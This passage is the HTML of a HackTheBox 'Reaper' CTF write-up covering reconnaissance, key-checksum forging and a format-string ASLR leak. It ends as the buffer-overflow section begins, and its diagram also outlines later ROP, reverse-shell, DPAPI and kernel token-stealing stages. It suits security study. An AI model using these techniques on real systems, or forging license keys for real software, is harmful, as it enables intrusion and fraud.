@@ -1,0 +1,1235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HackTheBox - Reaper: Format String ASLR Leak, VirtualAlloc ROP Chain, DPAPI Decryption &amp; Kernel Token Stealing | uziii2208</title>
+
+  <!-- Favicon & Brand Icons -->
+  <link rel="icon" type="image/svg+xml" href="../../favicon.svg">
+  <link rel="icon" type="image/png" sizes="64x64" href="../../favicon.png">
+  <link rel="alternate icon" href="../../favicon.ico">
+
+  <!-- OpenGraph / Twitter Meta -->
+  <meta name="description" content="Reaper is an Insane-difficulty Windows target on HackTheBox that tests the full spectrum of modern offensive security engineering-bridging userland reverse engineering,...">
+  <meta name="author" content="@uziii2208">
+  <meta property="og:title" content="HackTheBox - Reaper: Format String ASLR Leak, VirtualAlloc ROP Chain, DPAPI Decryption &amp; Kernel Token Stealing">
+  <meta property="og:description" content="Reaper is an Insane-difficulty Windows target on HackTheBox that tests the full spectrum of modern offensive security engineering-bridging userland reverse engineering,...">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://uziii2208.github.io/post/hackthebox-reaper/">
+  <meta property="og:image" content="https://uziii2208.github.io/post/hackthebox-reaper/hero.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="HackTheBox - Reaper: Format String ASLR Leak, VirtualAlloc ROP Chain, DPAPI Decryption &amp; Kernel Token Stealing">
+  <meta name="twitter:description" content="Reaper is an Insane-difficulty Windows target on HackTheBox that tests the full spectrum of modern offensive security engineering-bridging userland reverse engineering,...">
+  <meta name="twitter:image" content="https://uziii2208.github.io/post/hackthebox-reaper/hero.png">
+
+  <!-- Fonts & Stylesheet -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+  <link rel="preload" href="../../fonts/uziii2208-pixel.ttf" as="font" type="font/ttf" crossorigin>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  
+  <!-- Relative link to CSS -->
+  <link rel="stylesheet" href="../../css/style.css">
+
+  <!-- Code Highlighting -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+  <!-- Pre-compiled Post Data for Instant Global Palette Search -->
+  <script src="../../js/posts-data.js"></script>
+
+  <!-- Application Logic -->
+  <script src="../../js/app.js" defer></script>
+</head>
+<body class="page-post">
+
+<!-- ─── INTERACTIVE CYBER BACKGROUND CANVAS ─── -->
+<canvas id="cyber-canvas"></canvas>
+
+<!-- ─── READING PROGRESS LASER BAR ─── -->
+<div id="reading-progress"></div>
+
+<!-- ─── NAVIGATION ─── -->
+<nav>
+  <div class="nav-container">
+    <div class="nav-left">
+      <a class="nav-brand scramble-hover" href="/" onclick="return navigateToHome(event)" title="uziii2208 // Security Lab">
+        <span class="brand-prompt">&gt;</span>
+        <span class="brand-name">uziii<span class="brand-num">2208</span></span>
+        <span class="brand-cursor">_</span>
+        <span class="brand-badge">[0x0D]</span>
+      </a>
+      <ul class="nav-routes">
+        <li><a href="/" id="nav-link-home" class="nav-route-item" onclick="return navigateToHome(event)"><span class="route-num">01</span><span class="route-label">HOME</span></a></li>
+        <li><a href="../../post/" class="nav-route-item active"><span class="route-num">02</span><span class="route-label">WRITE-UPS</span></a></li>
+        <li><a href="https://github.com/uziii2208" target="_blank" rel="noopener noreferrer" class="nav-route-item"><span class="route-num">03</span><span class="route-label">GITHUB ↗</span></a></li>
+      </ul>
+    </div>
+    
+    <div class="nav-right">
+      <!-- SFX Equalizer Toggle -->
+      <button id="sfx-toggle" class="btn-sfx-hud" onclick="toggleSFX()" title="Toggle Sound Engine (Minecraft &amp; Casual Game SFX)" aria-label="Toggle Sound Effects">
+        <span class="sfx-eq-bars" aria-hidden="true">
+          <span class="sfx-bar bar-1"></span>
+          <span class="sfx-bar bar-2"></span>
+          <span class="sfx-bar bar-3"></span>
+        </span>
+        <span class="sfx-label">SFX:</span>
+        <span id="sfx-status" class="sfx-val">ON</span>
+      </button>
+
+      <!-- Universal Interactive Shortcut Controls -->
+      <div class="nav-shortcuts" role="toolbar" aria-label="Global Navigation Shortcuts">
+        <button type="button" class="nav-shortcut-btn" onclick="openCmdPalette()" title="Search Write-ups &amp; CVEs (Press / or Ctrl+K)">
+          <kbd class="shortcut-key">/</kbd>
+          <span class="shortcut-text">SEARCH</span>
+        </button>
+        <button type="button" class="nav-shortcut-btn" onclick="scrollToTop()" title="Scroll smoothly to top (Press ESC)">
+          <kbd class="shortcut-key">ESC</kbd>
+          <span class="shortcut-text">TOP</span>
+        </button>
+      </div>
+
+      <!-- Operator Badge -->
+      <a class="nav-operator-badge" href="https://github.com/uziii2208" target="_blank" rel="noopener noreferrer" title="Security Researcher Profile">
+        <span class="operator-dot"></span>
+        <span class="operator-id">@uziii2208</span>
+      </a>
+
+      <!-- Mobile Menu Hamburger Toggle -->
+      <button id="nav-hamburger-btn" class="nav-hamburger-btn" onclick="toggleMobileMenu()" title="Toggle Navigation Menu" aria-label="Toggle Navigation Menu" aria-expanded="false" aria-controls="mobile-menu-drawer">
+        <span class="hamburger-box">
+          <span class="hamburger-line line-1"></span>
+          <span class="hamburger-line line-2"></span>
+          <span class="hamburger-line line-3"></span>
+        </span>
+      </button>
+    </div>
+  </div>
+</nav>
+
+<!-- ─── MOBILE NAVIGATION DRAWER & BACKDROP ─── -->
+<div id="mobile-menu-backdrop" class="mobile-menu-backdrop" onclick="closeMobileMenu()"></div>
+<div id="mobile-menu-drawer" class="mobile-menu-drawer" aria-hidden="true">
+  <div class="mobile-drawer-header">
+    <div class="mobile-drawer-brand">
+      <span class="brand-prompt">&gt;</span>
+      <span class="brand-name">uziii<span class="brand-num">2208</span></span>
+      <span class="brand-badge">[0x0D]</span>
+    </div>
+    <button class="mobile-drawer-close" onclick="closeMobileMenu()" aria-label="Close navigation menu">✕</button>
+  </div>
+
+  <div class="mobile-drawer-content">
+    <div class="mobile-section-tag">// NAVIGATION</div>
+    <ul class="mobile-routes-list">
+      <li>
+        <a href="/" id="mobile-link-home" class="mobile-route-item" onclick="closeMobileMenu(); return navigateToHome(event)">
+          <span class="m-route-num">01</span>
+          <span class="m-route-label">HOME</span>
+          <span class="m-route-arrow">→</span>
+        </a>
+      </li>
+      <li>
+        <a href="../../post/" class="mobile-route-item active" onclick="closeMobileMenu()">
+          <span class="m-route-num">02</span>
+          <span class="m-route-label">WRITE-UPS</span>
+          <span class="m-route-arrow">→</span>
+        </a>
+      </li>
+      <li>
+        <a href="https://github.com/uziii2208" target="_blank" rel="noopener noreferrer" class="mobile-route-item" onclick="closeMobileMenu()">
+          <span class="m-route-num">03</span>
+          <span class="m-route-label">GITHUB ↗</span>
+          <span class="m-route-arrow">↗</span>
+        </a>
+      </li>
+    </ul>
+
+    <div class="mobile-section-tag">// TOOLS &amp; CONTROLS</div>
+    <div class="mobile-tools-grid">
+      <button type="button" class="mobile-tool-btn" onclick="closeMobileMenu(); openCmdPalette()">
+        <span class="m-tool-kbd">/</span>
+        <span class="m-tool-name">SEARCH WRITE-UPS</span>
+        <span class="m-tool-hint">Ctrl+K</span>
+      </button>
+      <button type="button" class="mobile-tool-btn" onclick="toggleSFX()">
+        <span class="m-tool-icon">♫</span>
+        <span class="m-tool-name">SOUND ENGINE</span>
+        <span id="mobile-sfx-status" class="m-tool-val">ON</span>
+      </button>
+    </div>
+
+    <div class="mobile-drawer-footer">
+      <a class="mobile-operator-badge" href="https://github.com/uziii2208" target="_blank" rel="noopener noreferrer">
+        <span class="operator-dot"></span>
+        <div class="mobile-operator-meta">
+          <span class="m-operator-handle">@uziii2208</span>
+          <span class="m-operator-desc">INDEPENDENT SECURITY RESEARCH</span>
+        </div>
+      </a>
+    </div>
+  </div>
+</div>
+
+<!-- ─── POST VIEW CONTAINER ─── -->
+<div id="post-view" style="display:block;">
+  <main>
+    <!-- Breadcrumbs -->
+    <div class="breadcrumb">
+      <a href="/" onclick="return navigateToHome(event)">home</a>
+      <span class="sep">//</span>
+      <a href="../../post/">write-ups</a>
+      <span class="sep">//</span>
+      <span class="crumb-current">hackthebox-reaper</span>
+    </div>
+
+    <!-- Top Action Bar -->
+    <div class="post-view-top-bar">
+      <a class="back-btn" href="../../post/">
+        <svg class="ui-icon" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+        <span>ALL WRITE-UPS</span>
+      </a>
+      <div class="post-ctrl-btns">
+        <button class="btn-ctrl" onclick="sharePost()" title="Share Advisory Link">
+          <svg class="ui-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
+          <span>SHARE</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Article Header -->
+    <div class="post-view-header">
+      <div class="post-tags" style="flex-direction:row;margin-bottom:1.2rem;gap:8px;align-items:center;">
+        <a href="../../post/?tag=htb" class="tag tag-htb" onclick="return navigateToTag(event, 'htb')" title="Filter by tag: htb">htb</a><a href="../../post/?tag=ctf" class="tag tag-ctf" onclick="return navigateToTag(event, 'ctf')" title="Filter by tag: ctf">ctf</a><a href="../../post/?tag=windows" class="tag tag-windows" onclick="return navigateToTag(event, 'windows')" title="Filter by tag: windows">windows</a>
+      </div>
+      <h1 class="post-view-title">HackTheBox - Reaper: Format String ASLR Leak, VirtualAlloc ROP Chain, DPAPI Decryption &amp; Kernel Token Stealing</h1>
+      <div class="post-meta-bar">
+        <span class="meta-item">
+          <svg class="ui-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          2026-02-03
+        </span>
+        <span class="meta-sep">/</span>
+        <span class="meta-item">
+          <svg class="ui-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          25 min read
+        </span>
+        <span class="meta-sep">/</span>
+        <span class="meta-item meta-author">
+          <svg class="ui-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+          @uziii2208
+        </span>
+      </div>
+    </div>
+
+    <!-- Two-Column Article Layout with Sticky TOC -->
+    <div class="post-body-layout">
+      <article class="post-main-content">
+        <!-- Post Hero Banner -->
+        <div class="post-hero-banner">
+          <img src="hero.png" alt="HackTheBox - Reaper: Format String ASLR Leak, VirtualAlloc ROP Chain, DPAPI Decryption &amp; Kernel Token Stealing" class="post-hero-img" loading="eager">
+        </div>
+
+        <div class="md-content" id="post-view-content">
+<p><img src="../../photos/reaper/image.png" alt="fuzter" /></p>
+<h2 id="introduction">Introduction</h2>
+<p><strong>Reaper</strong> is an Insane-difficulty Windows target on HackTheBox that tests the full spectrum of modern offensive security engineering-bridging userland reverse engineering, low-level binary exploitation under strict modern exploit mitigations, Windows DPAPI secrets extraction, and Ring-0 Windows kernel driver vulnerability research.</p>
+<p>Rather than relying on common misconfigurations or off-the-shelf CVEs, Reaper requires a structured zero-day vulnerability research approach. The initial foothold demands reverse engineering a proprietary licensing daemon (<code>dev_keysvc.exe</code>) running over TCP port 4141, exfiltrated via anonymous FTP. Static decompilation in Ghidra reveals a custom key checksum verification algorithm, an unconstrained format string vulnerability in the logging subsystem, and a stack-based buffer overflow in the base64 comment handler. Exploitation requires chaining a format string info-leak to defeat Address Space Layout Randomization (ASLR), followed by a 64-bit Return-Oriented Programming (ROP) chain that invokes <code>VirtualAlloc</code> to allocate executable memory, bypassing Data Execution Prevention (DEP/NX) to establish a reverse shell as <code>reaper\keysvc</code>.</p>
+<p>Post-exploitation transitions into local credential triage, where an encrypted DPAPI blob (<code>automation.txt</code>) is decrypted in-session using .NET reflection to extract plaintext credentials (<code>keysvc:CatWinterMist10</code>), granting interactive RDP access. Finally, local privilege escalation targets the core operating system: auditing a custom signed kernel driver (<code>reaper.sys</code>), reverse-engineering its IOCTL dispatch routines to construct an arbitrary 8-byte kernel read/write primitive, and traversing the active <code>_EPROCESS</code> circular linked list to duplicate the security token of <code>SYSTEM</code> (PID 4), achieving complete system takeover as <code>NT AUTHORITY\SYSTEM</code>.</p>
+<hr />
+<h2 id="attack-narrative-amp-architecture">Attack Narrative &amp; Architecture</h2>
+<p><img src="../../photos/reaper/attack-narrative.png" alt="HackTheBox Reaper Attack Narrative &amp; Architecture Diagram" /></p>
+<p>The compromise of Reaper follows a disciplined 5-stage offensive lifecycle:</p>
+<pre><code>+---------------------------------------------------------------------------------------------+
+|                                    REAPER ATTACK CHAIN                                      |
++---------------------------------------------------------------------------------------------+
+|                                                                                             |
+|   [Phase 1: Recon &amp; Exfiltration]                                                           |
+|       --&gt; Anonymous FTP (Port 21) -&gt; Exfiltrate dev_keys.txt &amp; dev_keysvc.exe binary        |
+|                                                                                             |
+|   [Phase 2: Reverse Engineering &amp; Dual Vulnerability Triage]                                |
+|       --&gt; Ghidra Static Decompilation -&gt; Map custom checksum validation algorithm           |
+|       --&gt; Format String Bug in _snprintf() -&gt; Leaks stack pointers to defeat ASLR           |
+|       --&gt; Unbounded Base64 Input -&gt; Stack Buffer Overflow (Offset: 88 bytes to RIP)         |
+|                                                                                             |
+|   [Phase 3: Mitigation Bypasses &amp; Userland Foothold]                                        |
+|       --&gt; Format String Leak (%pX) -&gt; Calculates Dynamic Image Base (pbase)                 |
+|       --&gt; 64-bit ROP Chain -&gt; VirtualAlloc(RSP, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE) |
+|       --&gt; Injects msfvenom Reverse Shell -&gt; Shell as reaper\keysvc (Port 9001)              |
+|                                                                                             |
+|   [Phase 4: Local Post-Exploitation &amp; DPAPI Triage]                                         |
+|       --&gt; Discovers C:\Users\keysvc\automation.txt DPAPI encrypted blob                     |
+|       --&gt; In-session DPAPI decryption via PowerShell .NET Reflection API                    |
+|       --&gt; Plaintext Credentials Recovered (keysvc:CatWinterMist10) -&gt; RDP (Port 3389)       |
+|                                                                                             |
+|   [Phase 5: Ring-0 Kernel Driver Weaponization]                                             |
+|       --&gt; Enumerates loaded drivers -&gt; Identifies C:\driver\reaper.sys                      |
+|       --&gt; Ghidra Driver Analysis: IOCTL 0x80002003 (Alloc) &amp; 0x8000200b (Arbitrary Copy)    |
+|       --&gt; Weapons-Grade Arbitrary 8-byte Kernel Read/Write Primitive (priv.c)               |
+|       --&gt; Walks _EPROCESS ActiveProcessLinks -&gt; Steals SYSTEM Token (PID 4)                 |
+|       --&gt; Spawns NT AUTHORITY\SYSTEM Shell -&gt; Full Root Compromise                          |
+|                                                                                             |
++---------------------------------------------------------------------------------------------+
+</code></pre>
+<h3 id="key-technical-takeaways">Key Technical Takeaways:</h3>
+<ul>
+<li><strong>Mitigation Synergy</strong>: Understanding why memory corruption vulnerabilities must be chained-using an information disclosure primitive (Format String) to defeat ASLR, followed by control-flow hijacking (ROP) to neutralize DEP/NX.</li>
+<li><strong>IAT-Constrained ROP Construction</strong>: Navigating real-world binary constraints where preferred APIs like <code>VirtualProtect</code> are absent from the Import Address Table (IAT), requiring creative repurposing of <code>VirtualAlloc</code> to allocate an executable stage.</li>
+<li><strong>DPAPI Architecture &amp; Scope</strong>: Exploiting the fundamental design of Windows DPAPI: encrypted data blobs can be decrypted without explicit passwords by any process executing in the security context of the user whose Master Key sealed them.</li>
+<li><strong>Kernel Internals &amp; Safe Token Stealing</strong>: Navigating undocumented Windows kernel structures (<code>_EPROCESS</code>, <code>ActiveProcessLinks</code>, <code>Token</code>) and weaponizing I/O Control (IOCTL) dispatch routines to achieve Ring-0 code execution without triggering kernel BugChecks (Blue Screen of Death).</li>
+</ul>
+<hr />
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning-amp-network-topology-mapping">Port Scanning &amp; Network Topology Mapping</h3>
+<p>We initiate network reconnaissance against the target IP (<code>10.129.234.200</code>) using <code>nmap</code>. Given that Windows machines frequently drop or throttle ICMP echo requests, we supply the <code>-Pn</code> flag to treat the host as online and enforce a minimum packet transmission rate of 5,000 packets per second (<code>--min-rate 5000</code>) across the entire 65,535 TCP port spectrum:</p>
+<pre><code class="language-bash">nmap -sCV -Pn -p- 10.129.234.200 --min-rate 5000 -oA Reaper.nmap
+</code></pre>
+<p>The scan reveals a concise attack surface consisting of standard management protocols alongside an unknown proprietary network daemon listening on high port <code>4141/TCP</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>FTP (Microsoft ftpd)</td>
+<td>Anonymous login allowed</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP (IIS 10.0)</td>
+<td>Default IIS page, nothing interesting</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>RDP</td>
+<td>CN=reaper</td>
+</tr>
+<tr>
+<td>4141</td>
+<td>Custom service</td>
+<td>Menu-driven key activation service</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>Port 21 (FTP)</strong>: Running Microsoft FTP Service. Crucially, the nmap script output indicates anonymous authentication (<code>ftp-anon</code>) is enabled.</li>
+<li><strong>Port 80 (HTTP)</strong>: Serves the default Microsoft Internet Information Services (IIS) 10.0 splash screen. A rapid directory bruteforce using <code>gobuster</code> and <code>feroxbuster</code> yields no hidden directories, web applications, or custom endpoints.</li>
+<li><strong>Port 3389 (RDP)</strong>: Standard Windows Remote Desktop protocol with TLS encryption. The self-signed certificate common name discloses the machine name: <code>reaper</code>.</li>
+<li><strong>Port 4141 (Unknown)</strong>: An unidentified listening TCP port. Banner grabbing indicates an interactive console daemon.</li>
+</ul>
+<hr />
+<h3 id="ftp-reconnaissance-amp-binary-exfiltration">FTP Reconnaissance &amp; Binary Exfiltration</h3>
+<p>Anonymous FTP access is frequently a treasure trove on CTF targets, often exposing staging environments, configuration files, or build artifacts. We connect using the standard <code>anonymous</code> username and a blank password:</p>
+<pre><code class="language-bash">ftp 10.129.234.200
+# Login: anonymous / (blank)
+binary          # CRITICAL: must set binary mode or exe transfer corrupts
+mget *
+</code></pre>
+<blockquote>
+<p>[!WARNING]
+<strong>FTP Binary Transfer Mode</strong>:
+In FTP clients, the default transfer mode is often ASCII. When transferring Windows Portable Executable (PE) files, ASCII mode will interpret any <code>0x0A</code> (Line Feed) byte and mangle it by prefixing a <code>0x0D</code> (Carriage Return) byte. This corrupts PE section headers, import tables, and machine code opcodes, making the binary crash immediately upon local execution. Always issue the <code>binary</code> command prior to downloading executables!</p>
+</blockquote>
+<p>The anonymous root directory exposes two files:</p>
+<ol>
+<li><code>dev_keys.txt</code> - An ASCII text file containing three development license keys and an operational note from the engineering team.</li>
+<li><code>dev_keysvc.exe</code> - A 64-bit Windows PE executable file corresponding directly to the daemon running remotely on port 4141.</li>
+</ol>
+<hr />
+<h3 id="analyzing-dev-keys-txt">Analyzing <code>dev_keys.txt</code></h3>
+<p>Examining the downloaded text file:</p>
+<pre><code>Development Keys:
+
+100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
+101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
+102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl
+
+The dev keys can not be activated yet, we are working on fixing a bug in the activation function.
+</code></pre>
+<p>Several observations emerge from this license sample:</p>
+<ul>
+<li><strong>Key Structure</strong>: Every key follows a distinct hyphen-delimited format: <code>XXX-XXXXX-XXX-XXXX-XXXX-BASE64==</code>.</li>
+<li><strong>Base64 Trailers</strong>: Decoding the trailing base64 strings:
+<ul>
+<li><code>U3RhbmRhcmQgTGljZW5zZQ==</code> → <code>Standard License</code></li>
+<li><code>UHJlbWl1bSBMaWNlbnNl</code> → <code>Premium License</code></li>
+</ul>
+</li>
+<li><strong>Developer Note</strong>: The developers explicitly note: <em>&quot;The dev keys can not be activated yet, we are working on fixing a bug in the activation function.&quot;</em> This hint points towards an intentional software defect inside the key activation routine.</li>
+</ul>
+<hr />
+<h3 id="port-4141-network-service-interaction">Port 4141 Network Service Interaction</h3>
+<p>We probe port 4141 interactively via <code>netcat</code> to analyze the protocol behavior:</p>
+<pre><code class="language-bash">nc 10.129.234.200 4141
+</code></pre>
+<p>The daemon presents a clear-text command-line menu:</p>
+<pre><code>Choose an option:
+1. Set key
+2. Activate key
+3. Exit
+</code></pre>
+<p>Testing the workflow manually:</p>
+<ol>
+<li>Submitting <code>1</code> prompts the operator: <code>Enter a key:</code>.</li>
+<li>Pasting the first dev key (<code>100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==</code>) yields: <code>[+] Valid key format</code>.</li>
+<li>Selecting <code>2</code> (&quot;Activate key&quot;) results in: <code>[-] Could not find key!</code>.</li>
+<li>Submitting a random string (e.g., <code>AAAA-BBBB</code>) results in: <code>[-] Invalid key format!</code>.</li>
+</ol>
+<p>This indicates that <code>dev_keysvc.exe</code> performs <strong>two independent stages of verification</strong>:</p>
+<ul>
+<li><strong>Stage 1 (Syntax &amp; Integrity Validation)</strong>: The input string is parsed by an algorithmic validation check (presumably involving length, delimiters, and a mathematical checksum). If this fails, the key is immediately rejected.</li>
+<li><strong>Stage 2 (Database Allowlist Check)</strong>: If the syntax and checksum are valid, the service attempts to locate the key inside a server-side storage file (<code>keys.txt</code>). Because the dev keys are not in the production database, activation fails with <code>Could not find key!</code>.</li>
+</ul>
+<p>To identify how memory is handled and where vulnerabilities reside, we must move to offline reverse engineering.</p>
+<hr />
+<h2 id="reverse-engineering-dev-keysvc-exe">Reverse Engineering - <code>dev_keysvc.exe</code></h2>
+<h3 id="initial-binary-reconnaissance-amp-mitigation-auditing">Initial Binary Reconnaissance &amp; Mitigation Auditing</h3>
+<p>We begin our static analysis by inspecting printable strings and auditing the compiled binary protections on our Linux host:</p>
+<pre><code class="language-bash">strings dev_keysvc.exe | grep -iE &quot;key|valid|activ|error|license|format&quot;
+</code></pre>
+<p>The output reveals informative debug logging strings and references to file I/O:</p>
+<pre><code>[Debug] Key too short!
+[Debug] Invalid character (%d)!
+[Debug] Checksum Provided: %d
+[Debug] Checksum Calculated: %d
+[Debug] Invalid checksum!
+keys.txt
+</code></pre>
+<p>Next, we inspect the PE header flags and exploit mitigations using <code>winchecksec</code> (or <code>dumpbin /headers</code>):</p>
+<pre><code>Dynamic Base : Present   (ASLR enabled)
+NX           : Present   (DEP enabled)
+GS           : Present   (stack cookies)
+CFG          : NotPresent
+</code></pre>
+<h4>Security Mitigation Breakdown:</h4>
+<ul>
+<li><strong>Dynamic Base (ASLR - Address Space Layout Randomization)</strong>: The base address of <code>dev_keysvc.exe</code> is randomized at every execution. Hardcoded absolute memory addresses cannot be used in our exploit; we must discover an information disclosure vulnerability to leak a runtime address and calculate the dynamic process base (<code>pbase</code>).</li>
+<li><strong>NX / DEP (Data Execution Prevention / W^X)</strong>: The stack and heap memory regions are marked non-executable (<code>PAGE_READWRITE</code>). Injecting shellcode directly onto the stack and jumping to it will immediately trigger an access violation (<code>STATUS_DATATYPE_MISALIGNMENT</code> or <code>STATUS_ACCESS_VIOLATION</code>). We must construct a Return-Oriented Programming (ROP) chain.</li>
+<li><strong>GS (Buffer Security Check / Stack Canaries)</strong>: Stack cookies are compiled into vulnerable functions to detect linear buffer overflows before returning from a function frame.</li>
+<li><strong>CFG (Control Flow Guard)</strong>: Disabled. Function pointers and indirect call sites (<code>call rax</code>, <code>jmp [rbx]</code>) are not verified against an OS bitmap table, simplifying ROP execution.</li>
+</ul>
+<hr />
+<h3 id="ghidra-decompilation-key-validation-routine">Ghidra Decompilation - Key Validation Routine</h3>
+<p>We load <code>dev_keysvc.exe</code> into Ghidra and allow auto-analysis to finish. Searching for the string <code>&quot;[Debug] Invalid checksum!&quot;</code> leads us directly to the validation xref inside function <code>FUN_140001760</code>.</p>
+<h4>Key Structural Constraints</h4>
+<p>Analyzing the disassembly reveals that the input string is checked for structural syntax at specific 0-indexed character offsets:</p>
+<pre><code>Pos:  0  1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18  19+
+      X  X  X  -  X  X  X  X  X  -  X  X  X  -  X  X  X  X  -  CHECKSUM-COMMENT
+</code></pre>
+<ul>
+<li>Dashes (<code>-</code>) are strictly required at index <code>3</code>, <code>9</code>, <code>13</code>, and <code>18</code>.</li>
+<li>Characters in between the dashes must be ASCII printable characters.</li>
+<li>Index <code>19</code> onwards contains a 4-digit numeric checksum followed by an optional hyphen and base64 comment string.</li>
+</ul>
+<h4>Decompiled Checksum Algorithm</h4>
+<p>The decompiled C code calculates a checksum across the first 18 characters:</p>
+<pre><code class="language-c">// Sum all non-dash characters at positions 0-17
+// subtract 0x30 from each byte value
+// result mod 10000 = 4-digit checksum
+
+local_28 = 0;
+while (local_18 &lt; strlen(key)) {
+    if (local_18 &lt; 0x12 &amp;&amp; key[local_18] != '-') {
+        local_28 += (int)key[local_18] - 0x30;
+    }
+    local_18++;
+}
+checksum = local_28 % 10000;
+// compare checksum to 4-digit integer parsed from position 19
+</code></pre>
+<p>The algorithm is straightforward:</p>
+<ol>
+<li>Initialize an accumulator (<code>local_28</code>) to <code>0</code>.</li>
+<li>Iterate through index <code>0</code> to <code>17</code> (<code>local_18 &lt; 0x12</code>).</li>
+<li>If the character is not a hyphen (<code>key[local_18] != '-'</code>), take its ASCII value, subtract <code>0x30</code> (<code>48</code> in decimal, equivalent to ASCII <code>'0'</code>), and add the resulting integer to the accumulator.</li>
+<li>Calculate the checksum by taking <code>accumulator % 10000</code>.</li>
+<li>Parse the 4 characters starting at position <code>19</code> as a decimal integer using <code>atoi()</code> and verify that it equals the calculated checksum.</li>
+</ol>
+<hr />
+<h3 id="algorithmic-verification-in-python">Algorithmic Verification in Python</h3>
+<p>To weaponize this understanding, we write a Python function that replicates the checksum generator:</p>
+<pre><code class="language-python">def calc_checksum(prefix):
+    # prefix = &quot;XXX-XXXXX-XXX-XXXX&quot;
+    total = sum(ord(c) - 0x30 for c in prefix if c != '-')
+    return total % 10000
+
+prefix = &quot;100-FE9A1-500-A270&quot;
+cs = calc_checksum(prefix)
+print(f&quot;Checksum: {cs}&quot;)          # 102 - matches dev key!
+print(f&quot;Full key: {prefix}-{cs:04d}&quot;)
+</code></pre>
+<p>Running this script yields <code>102</code>. Formatted with four digits (<code>0102</code>), it matches the first development key <code>100-FE9A1-500-A270-0102</code> exactly. We can now forge syntactically valid license keys with arbitrary prefixes and payloads!</p>
+<hr />
+<h3 id="discovering-vulnerability-1-format-string-bug-cwe-134">Discovering Vulnerability 1: Format String Bug (CWE-134)</h3>
+<p>Tracing the execution flow when Option 2 (&quot;Activate key&quot;) is invoked, the service calls an internal logging routine <code>log_key</code>. Decompiling this function reveals a textbook format string flaw:</p>
+<pre><code class="language-c">_snprintf(key_string, 0xff2, (char *)key);  // key IS the format string
+</code></pre>
+<p>In secure programming, <code>_snprintf</code> should always be called with a static format specifier string: <code>_snprintf(buffer, size, &quot;%s&quot;, user_input)</code>. Here, however, the developer passed <code>(char *)key</code> directly as the second argument (the format string).</p>
+<p>Because the user controls the format string parameter, any <code>%</code> specifiers inside our key will be evaluated by the C runtime library:</p>
+<ul>
+<li><code>%p</code>: Leaks a pointer off the current stack frame.</li>
+<li><code>%s</code>: Dereferences a pointer on the stack and prints arbitrary memory.</li>
+<li><code>%n</code>: Writes the number of characters printed so far to a target memory address.</li>
+</ul>
+<p>In Windows x64 binaries, the calling convention passes the first four integer/pointer arguments via registers (<code>RCX</code>, <code>RDX</code>, <code>R8</code>, <code>R9</code>), with subsequent arguments spilled onto the stack. Sending a format string like <code>%p</code> allows us to dump stack memory.</p>
+<p>Testing with <code>%pX</code> (using <code>X</code> as a clean delimiter):</p>
+<ul>
+<li>The service prints <code>Checking key: 0x7ff7xxxxxxxxX</code>.</li>
+<li>The leaked address consistently points to a string literal in the <code>.rdata</code> segment of <code>dev_keysvc.exe</code> (<code>&quot;Checking key: &quot;</code>), located at static offset <code>0x20660</code> from the image base.</li>
+<li><strong>ASLR Defeated</strong>: <code>Process Base (pbase) = Leaked_Address - 0x20660</code>.</li>
+</ul>
+<hr />
+<h3 id="discovering-vulnerability-2-stack-based-buffer-overflow-cwe-121">Discovering Vulnerability 2: Stack-Based Buffer Overflow (CWE-121)</h3>
+<p>While the key prefix up to index 18 is strictly checked for format and checksum, the key parser handles the trailing comment after the checksum (everything following index 19) differently:</p>
+<ul>
